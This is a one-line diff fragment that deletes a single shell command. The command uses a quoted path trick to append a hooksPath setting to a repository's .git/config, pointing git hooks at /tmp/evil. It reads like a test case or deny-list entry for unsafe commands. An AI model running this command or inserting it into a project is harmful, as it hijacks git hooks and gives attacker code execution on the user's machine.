@@ -1,1 +1,0 @@
-echo 'hooksPath = /tmp/evil' >> .git/info/exclude""/../config
